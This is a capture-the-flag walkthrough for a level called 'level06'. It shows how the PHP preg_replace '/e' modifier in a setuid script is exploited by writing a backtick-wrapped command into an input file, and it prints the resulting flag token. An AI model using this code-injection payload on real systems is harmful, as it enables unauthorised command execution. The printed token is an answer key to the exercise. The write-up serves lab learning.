solution level06:

> ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php

we have a binary file and a php script

> cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

we have a function x which takes two arguments, and tests some regexes on the content of the first argument
we can also see that the 'e' regex modifier is used: the replacement string will get evaluated for every match
we can try to exploit this so as to execute the getflag command

-> we need to match the first regex /(\[x (.*)\])", and make sure getflag gets evaluated:
> echo '[x ${`getflag`}]' > /tmp/flag

-> we run the program level06 with the file /tmp/flag as parameter:
> ./level06 /tmp/flag

PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
